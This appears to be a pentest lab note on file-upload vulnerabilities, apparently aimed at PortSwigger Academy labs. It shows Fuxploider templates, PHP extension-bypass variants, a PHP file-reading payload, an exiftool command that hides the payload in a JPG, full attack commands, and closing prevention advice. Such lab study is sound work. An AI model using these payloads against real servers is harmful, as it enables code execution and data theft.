## Fuxploider

I've added a way to have a CSRF token/URL to the tool.

This is what can be achieve with it:
- Double extension
- Mime type tampering 
- Null byte poisoning and variants
- Case sensitive checks
- Alternative extensions
- getimagesize() bypass

### Templates
You can add new templates (templates.json):
```json
{
	"templateName" : "burp",
	"description" : "None",
	"filename":"template_burp.php",
	"nastyExt":"php",
	"codeExecRegex":"[a-z-A-Z0-9]{32}",
	"extVariants":["php1","php2","php3","php4","php5","phtml","pht","Php","PhP","pHp","pHp1","pHP2","pHtMl","PHp5"]
}

```

This is the payload:
```php
<?php 
	echo file_get_contents('/home/carlos/secret');
?>
```

### Payload in metadata
Make the payload:

```bash
exiftool -Comment="<?php echo file_get_contents('/home/carlos/secret'); ?>" burp.jpg -o out.jpg
```

Make the template:
```json
{
    "templateName" : "nastyjpgburp",
    "description" : "Valid JPG file with payload in the comments section of the file",
    "filename":"out.jpg",
    "nastyExt":"php",
    "codeExecRegex":"[a-z-A-Z0-9]{32}",
    "extVariants":["php1","php2","php3","php4","php5","phtml","pht","Php","PhP","pHp","pHp1","pHP2","pHtMl","PHp5"]
}
```

### Command examples

With the burp template:
```bash
python3 fuxploider.py --url https://acba1f601fdb6b9ac05944ad004900d5.web-security-academy.net/my-account --cookie "session=A6gc76vS4KjQ3suFdntqt41hXS1U91Mq" --uploads-path "files/avatars" --not-regex "are not allowed" --proxy 127.0.0.1:8080 --form-action "/my-account/avatar" --csrf-url "https://acba1f601fdb6b9ac05944ad004900d5.web-security-academy.net/my-account" --csrf-token "csrf" --data "user=wiener" -t burp -T 10
```

With the nastyjpgburp template:
```bash
python3 fuxploider.py --url https://ac361fe51f12f03ac09d229700ce0094.web-security-academy.net/my-account --cookie "session=ltOlpIVBCrkqaEAZLdAyLxqV58C0zPLF" --uploads-path "files/avatars" --not-regex "are not allowed" --proxy 127.0.0.1:8080 --form-action "/my-account/avatar" --csrf-url "https://ac361fe51f12f03ac09d229700ce0094.web-security-academy.net/my-account" --csrf-token "csrf" --data "user=wiener" -t nastyjpgburp -T 10
```

## File upload path traversal


## File upload race condition



## Other methodologies
- (https://book.hacktricks.xyz/pentesting-web/file-upload)[https://book.hacktricks.xyz/pentesting-web/file-upload]
- (https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files]


## How to prevent file upload vulnerabilities
Allowing users to upload files is commonplace and doesn't have to be dangerous as long as you take the right precautions. In general, the most effective way to protect your own websites from these vulnerabilities is to implement all of the following practices:

- Check the file extension against a whitelist of permitted extensions rather than a blacklist of prohibited ones. It's much easier to guess which extensions you might want to allow than it is to guess which ones an attacker might try to upload.
- Make sure the filename doesn't contain any substrings that may be interpreted as a directory or a traversal sequence (../).
- Rename uploaded files to avoid collisions that may cause existing files to be overwritten.
- Do not upload files to the server's permanent filesystem until they have been fully validated.
- As much as possible, use an established framework for preprocessing file uploads rather than attempting to write your own validation mechanisms.

More preventions : (Here)[https://www.hacksplaining.com/prevention/file-upload]